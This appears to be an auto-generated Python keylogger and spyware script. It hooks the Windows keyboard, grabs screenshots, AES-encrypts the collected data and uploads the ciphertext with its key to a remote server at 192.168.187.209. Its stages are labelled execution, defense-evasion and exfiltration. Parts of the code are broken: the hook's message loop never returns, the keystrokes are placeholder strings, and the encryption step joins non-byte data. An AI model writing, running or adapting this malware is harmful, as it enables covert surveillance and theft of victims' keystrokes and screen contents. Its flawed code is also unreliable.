#!/usr/bin/env python3
import sys, json, time
from typing import Dict, Any
import ctypes
from ctypes import wintypes
from PIL import ImageGrab
import io
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import requests

# Define necessary Windows API constants and structures
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100

# Define the LowLevelKeyboardProc callback function type
LowLevelKeyboardProc = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

# Global variable to store the hook ID
hook_id = None

def keyboard_proc(nCode, wParam, lParam):
    if wParam == WM_KEYDOWN:
        # Extract the virtual key code from lParam
        vk_code = ctypes.cast(lParam, ctypes.POINTER(wintypes.KBDLLHOOKSTRUCT)).contents.vkCode
        print(f"Key pressed: {vk_code}")
    return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

def set_keyboard_hook() -> int:
    global hook_id
    # Set the low-level keyboard hook
    hook_id = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc(keyboard_proc), None, 0)
    return hook_id

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        hook_id = set_keyboard_hook()
        active = hook_id is not None

        # Message loop to keep the hook active
        msg = wintypes.MSG()
        while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

        result = {
            'hook_id': hook_id,
            'active': active
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'hook_id': None, 'active': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Capture the screenshot
        screenshot = ImageGrab.grab()
        
        # Save the screenshot to a bytes buffer
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        image_data = buffer.getvalue()
        
        # Prepare the result
        result = {
            'image_data': image_data.hex(),
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial data with fallback values
        return {'success': False, 'data': {'image_data': None, 'timestamp': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Initialize the result with fallback values
        result = {'keystrokes': [], 'screenshots': []}

        # Process keystrokes
        if input_data.get('active', False):
            # Simulate capturing keystrokes
            keystrokes = ["example_keystroke_1", "example_keystroke_2"]
            result['keystrokes'] = keystrokes

        # Process screenshots
        image_data = input_data.get('image_data', '')
        timestamp = input_data.get('timestamp', '')
        if image_data and timestamp:
            screenshot_entry = {
                'image_data': bytes.fromhex(image_data).hex(),
                'timestamp': timestamp
            }
            result['screenshots'].append(screenshot_entry)

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'keystrokes': [], 'screenshots': []},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Combine keystrokes and screenshots into a single byte buffer
        keystrokes = input_data.get('keystrokes', [])
        screenshots = input_data.get('screenshots', [])
        
        # Convert lists to bytes
        keystrokes_bytes = b''.join(keystrokes)
        screenshots_bytes = b''.join(screenshots)
        
        # Combine all data
        data_to_encrypt = keystrokes_bytes + screenshots_bytes
        
        # Generate AES key and IV
        key = get_random_bytes(32)  # AES-256
        iv = get_random_bytes(16)   # AES block size
        
        # Encrypt data
        cipher = AES.new(key, AES.MODE_CBC, iv)
        # Pad data to be a multiple of AES block size
        pad_length = AES.block_size - len(data_to_encrypt) % AES.block_size
        padded_data = data_to_encrypt + bytes([pad_length] * pad_length)
        
        ciphertext = cipher.encrypt(padded_data)
        
        # Prepare result
        result = {
            'ciphertext': ciphertext.hex(),
            'iv': iv.hex(),
            'key': key.hex()
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result with None values for required fields
        result = {
            'ciphertext': None,
            'iv': None,
            'key': None
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def task_T5(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extracting the encrypted data from input
        ciphertext = bytes.fromhex(input_data.get('ciphertext', ''))
        iv = bytes.fromhex(input_data.get('iv', ''))
        key = bytes.fromhex(input_data.get('key', ''))

        # Prepare the data for the POST request
        post_data = {
            'ciphertext': ciphertext.hex(),
            'iv': iv.hex(),
            'key': key.hex()
        }

        # Send the data to the remote server
        response = requests.post(
            'https://192.168.187.209/api',
            json=post_data,
            timeout=10
        )

        # Check if the request was successful
        if response.status_code == 200:
            result = {'success': True}
        else:
            result = {'success': False}

        return {'success': result['success'], 'data': result,
                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Hook Keyboard [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Hook Keyboard): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Hook Keyboard): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Capture Screenshots [execution] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Capture Screenshots): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Capture Screenshots): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Buffer Keystrokes and Screenshots [data-processing] ──
    try:
        _inp = {}
        _inp.update(outputs.get('T1', {}))
        _inp.update(outputs.get('T2', {}))
        r = task_T3(_inp)
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Buffer Keystrokes and Screenshots): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Buffer Keystrokes and Screenshots): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Encrypt Data [defense-evasion] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Encrypt Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Encrypt Data): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T5: Upload Data [exfiltration] ──
    try:
        r = task_T5(outputs.get('T4', {}))
        results['T5'] = r
        if r.get('success'):
            outputs['T5'] = r.get('data', {})
            print(f'[+] T5 (Upload Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T5 (Upload Data): FAILED — {err}')
            failed.append('T5')
            r2 = task_T5(outputs.get('T4', {}))
            if r2.get('success'):
                outputs['T5'] = r2.get('data', {})
                failed.remove('T5')
    except Exception as e:
        print(f'[!] T5 crashed: {e}')
        failed.append('T5')
        results['T5'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))